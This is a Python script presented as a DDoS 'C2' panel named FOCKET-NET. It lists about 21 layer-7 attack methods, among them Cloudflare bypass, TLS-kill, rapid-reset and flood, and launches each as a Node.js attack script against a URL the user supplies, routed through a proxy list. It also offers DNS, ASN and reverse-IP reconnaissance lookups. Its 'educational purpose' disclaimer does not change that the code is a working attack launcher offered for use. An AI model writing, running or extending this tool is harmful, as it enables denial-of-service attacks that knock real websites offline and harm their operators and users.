import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.4)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.4)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.4)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.7)
    clear()


def tools():
    clear()
    print(f'''
\033[37mreverseip► Chek url for ip
\033[37mdns ► Check dns
\033[37masn-lookup ► asn lookup
\033[37msubnet-lookup  ►  Subnet lookup
\033[37mreverse-dns ►  Reverse dns
''')

def rules():
    clear()
    print(f'''
                1. For education purpose             
                2. Only attack stress testing servers         
                3. Dont trust anyone                
                4. The creator does not do any harm           
                
''')
    
def layer7():
    clear()
    print("""

 

            |$$$$$  |$$$$$$$$ |$$$$$$  |$$   $$$   |$$$$$$$$  |$$$$$$$$$$
            |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$
            |$$     |$$    $$ |$$      |$$$$$      |$$           |$$
            |$$$$%  |$$    $$ |$$      |$$$$$      |$$$$$$$$     |$$
            |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$
            |$$     |$$    $$ |$$      |$$   $$$   |$$           |$$
            |$$     |$$$$$$$$ |$$$$$$$ |$$     $$$ |$$$$$$$$     |$$
                        
                                                                                       
                                                      
\033[35mFOCKET Creator
\033[37mWelcome: Tools DOS By FOCKET
\033[34mMessage: Have fun 
\033[38;5;220m
]-------------------------------------[

[ LAYER - 7 ]

\033[33m
\033[38;5;208m– .AQUA | Cloudflare [BASIC]
– .BASIC | BASIC Method [BASIC]
– .BOT | BOT low [low power]
– .BYPASS | BYPASS Attack [Full power]
– .BYPASS-SILIT | BYPASS-SILIT Method [Cloudflare-uam]
– .Crash | Crash Method [BASIC]
– .FLOOD | FLOOD Method [BASIC]
– .FLOODER | FLOODER Method [BYPASS]
– .gojo | gojo Method [Hard]
– .gojo-vip | gojo-vip Method [Hard]
– .hold | hold Method [VIP]
– .MIX | MIX Method [VIP]
– .NUKE | NUKE Method [VIP Hard]
– .POWER | POWER  Methods [VIP]
– .rapid-reset | rapid-reset Methods [VIP]
– .ROSE | ROSE Method [VVIP]
– .SLOW | SLOW Method [BASIC]
– .SPAM | SPAM Method [BASIC]
- .TLS-kill | TLS-kill Method [VVIP]
- .TLS-VIP | TLS-VIP Method [VVIP]
- .TLZ  | TLZ | Method [VIP]


\033[38;5;220m

[ FOCKET-NET ]

]-------------------------------------[
\033[0m
""")

def exit_program():
    clear()
    sys.exit()
    print('''C2 Exit''')


def menu():
    sys.stdout.write(f"         \x1b]2; FOCKET-NET PANEL--> Stars: [{bots}] | Online Users: [1] | Methods: [21] | Bypass: [5]\x07")
    clear()
    print("""

 
 
            |$$$$$  |$$$$$$$$ |$$$$$$  |$$   $$$   |$$$$$$$$  |$$$$$$$$$$
            |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$
            |$$     |$$    $$ |$$      |$$$$$      |$$           |$$
            |$$$$%  |$$    $$ |$$      |$$$$$      |$$$$$$$$     |$$
            |$$     |$$    $$ |$$      |$$  $$$    |$$           |$$
            |$$     |$$    $$ |$$      |$$   $$$   |$$           |$$
            |$$     |$$$$$$$$ |$$$$$$$ |$$     $$$ |$$$$$$$$     |$$

                                                                                       
                                        
 \033[38mWelcome - focket [ C2 ].             
 
\033[35mAttack Tools
\033[37mWelcome: Tools DOS By FOCKET Type [help] To Start Attack
\033[34mEnjoy Your Stay
""")

def main():
    menu()
    while(True):
        cnc = input('''\033[38;5;208m┌──(root㉿PANEL)-[\033[32m/Attack\033[38;5;208m]\033[0m
\033[38;5;208m└─\033[0m#\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m''')
        if cnc == "method" or cnc == "methods" or cnc == "METHODS" or cnc == "METHOD":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "exit" or cnc == "ext" or cnc == "EXIT" or cnc == "Exit":
            exit_program()


# LAYER 7 METHODS
 
        elif "AQUA" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node AQUA.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: AQUA <target> <time>')
                
        elif "BASIC" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node BASIC.js {url} {time} 5 proxy.txt 100 captha')
            except IndexError:
                print('Usage: BASIC <url> <time>')
                
        elif "BOT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node BOT.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: BOT <url> <time>')
                
        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node BYPASS.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: BYPASS <url> <time>')
                
        elif "BYPASS-SILIT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node BYPASS-SILIT.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: BYPASS-SILIT <url> <time>')
                
        elif "Crash" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node Crash.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: Crash <url> <time>')
                
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node FLOOD.js {url} {time} 5 proxy.txt 100 50')
            except IndexError:
                print('Usage: FLOOD <url> <time>')
                
                
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node FLOODER.js {method} {time} 5 proxy.txt 100 bypass')
            except IndexError:
                print('Usage: FLOODER <url> <time> ')
                
        elif "TLS-V2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node TLS-V2.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: TLS-V2 <url> <time> <rps> <thread>')
                
        elif "gojo" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node gojo.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: gojo <url> <time>')
                
        elif "gojo-vip" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node gojo-vip.js GET {time} 5 proxy.txt 100 {url}')
            except IndexError:
                print('Usage: gojo-vip <url> <time>')
                
        elif "hold" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node hold.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: hold <url> <time>')
                
        elif "MIX" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                ascii_vro()
                os.system(f'node MIX.js {url} {time} {rate} {thread} proxy.txt')
            except IndexError:
                print('Usage: MMIX <url> <time> <rate> <thread>')
                
        elif "NUKE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node NUKE.js {url} {time} 5 proxy.txt 100')
            except IndexError:
                print('Usage: NUKE <url> <time>')
                
        elif "POWER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node POWER.js GET {url} proxy.txt {time} 100 5')
            except IndexError:
                print('Usage: POWER <url> <time>')
                
        elif "rapid-reset" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node rapid-reset.js {url} {time} 5 100 proxy.txt')
            except IndexError:
                print('Usage: rapid-reset <url> <time>')
                
        elif "ROSE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node ROSE.js {url} {time} 100 5 proxy.txt bypass')
            except IndexError:
                print('Usage: ROSE <url> <time>')
                
        elif "SLOW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node SLOW.js {url} {time} 100 5 GET proxy.txt')
            except IndexError:
                print('Usage: SLOW <url> <time>')
                
        elif "SPAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node SPAM.js {url} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: SPAM <url> <time>')
                
        elif "TLS-kill" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node TLS-VIP.js {url} 5 100 GET {time}')
            except IndexError:
                print('Usage: TLS-kill <url> <time>')
                
        elif "TLS-VIP" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node TLS-VIP.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: TLS-VIP <url> <time>')
                
        elif "TLZ" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                ascii_vro()
                os.system(f'node TLZ.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: TLZ <url> <time> <rps> <thread> <proxy>')
                
       
       
#TOOLS

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns <dns>')
                print('Example: dns google.com')

        elif "reverse-dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')
                

        elif "help" in cnc:
            print(f'''
METHODS ► SHOW ALL METHODS
RULES      ► RULES PANEL
TOOLS     ► SHOW TOOLS
CLEAR    ► CLEAR TERMINAL
Exit   l     ► Keluar dari tools
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = ""
    passwd = ""
    username = input(" 🚀 Username: ")
    password = getpass.getpass(prompt='🚀 Password: ')
    if username != user or password != passwd:
        print("")
        print("🚀 Wrong Pass.")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🚀 Welcome to FOCKET-NET PANEL!")
        main()

login()
